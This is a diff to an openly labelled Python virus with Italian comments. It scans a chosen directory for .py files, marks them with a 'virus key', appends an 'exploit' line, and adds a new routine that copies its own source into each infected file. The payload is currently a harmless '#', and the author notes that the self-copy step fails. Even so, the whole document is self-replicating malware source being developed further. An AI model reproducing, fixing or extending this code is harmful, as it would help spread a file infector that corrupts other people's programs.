@@ -1,7 +1,7 @@
 
 # Importazioni necessarie
 
-import os, sys, shutil, random, glob
+import os, sys, shutil, random, glob, time
 
 viruskey = "#! My Virus Key: 1x2y3z"
 infettato = "No"
@@ -17,27 +17,24 @@ myself = sys.argv[0]
 #1 indentificazione
 
 def identificazione():
-	infettato = "No"
+
 	_path_ = os.getcwd() # ottengo la directory corrente
 	for path, directory, files in os.walk(_path_): # ottengo tutte le directory, sottodirectory e files prsenti nella path
-		#print(files)
 		for file in files:
+			time.sleep(0.5)
 			_file_, punto, estensione = file.partition('.') # Suddivide il file in tre parti separate dal punto, se dopo il punto 
 			if estensione == "py": # vi è py (estensione file python) il il file e' infettabile
-				#print(file)
 				try:
+					infettato = "No"
 					fileopen = open(file, 'r') # Apri il file per leggerlo
 					for line in fileopen: # Analizzo le righe			
-						if line == viruskey: #Se non trovi la key del virus il file non e' infetto
+						if viruskey in line: #Se non trovi la key del virus il file non e' infetto
 							infettato = "Si"
+							print("[*] File gia' infettato > " + file)
 							break
-						else: # Se no e' infetto
-							pass
 					if infettato == "No": # Avvia infezione del file non infetto
 						print("[+] Infetto il file... " + file)
 						infezione(file)
-					elif infettato == "Si":
-						print("[*] File gia' infettato! " + file + " KEY: " + str(viruskey))
 				except FileNotFoundError:
 					pass
 			else:
@@ -47,9 +44,10 @@ def identificazione():
 
 #exploit = """"""
 def infezione(file):
+	
 	exploitstatus = "No" # Stato dell'Exploit negativo (vuol dire che non e' stato ancora iniettato)
-	exploit = 'print("Exploited")' # Questo è l'Exploit, e' possibile cambiarlo con altri
-	print("[*] Preparo l'Exploit...")
+	exploit =  "#" #'print("Exploited_)' # Questo è l'Exploit, e' possibile cambiarlo con altri
+	print("\n[*] Preparo l'Exploit...")
 	try:
 		file = open(file, 'a') # Apro il file
 		file.write("\n" + viruskey + "\n" + exploit) # Inietto l'exploit nel file vittima
@@ -59,16 +57,28 @@ def infezione(file):
 		pass
 	if exploitstatus == "Si": # Se l'exploit è stato iniettato procendi con la Replicazione
 		print("[+] Infezione Riuscita")
-		#replicazione(file)
+		print("[*] Mi copio nel file...")
+		miacopia(file)
 	else:
 		pass
 
 
+def miacopia(file): # Qui ho dei problemi, non mi scrive nulla nei file in cui dovrebbe copiarsi
+	myself = sys.argv[0]
+	myself = open(myself, 'r')
+	file = open(file, 'a')
+	for line in myself:
+		file.write(line)
+	print("[+] File infettato Correttamente!")
+	file.close()
+	myself.close()
+
 if __name__ == '__main__':
-	print(banner)
+	
+	print(banner) # Banner
 	try:
 		directory = input("Path >> ")
-		os.chdir(directory)
+		os.chdir(directory) # Cambia directory in quella inserita
 	except FileNotFoundError :
 		print("[!] Path non Trovata")
 		exit
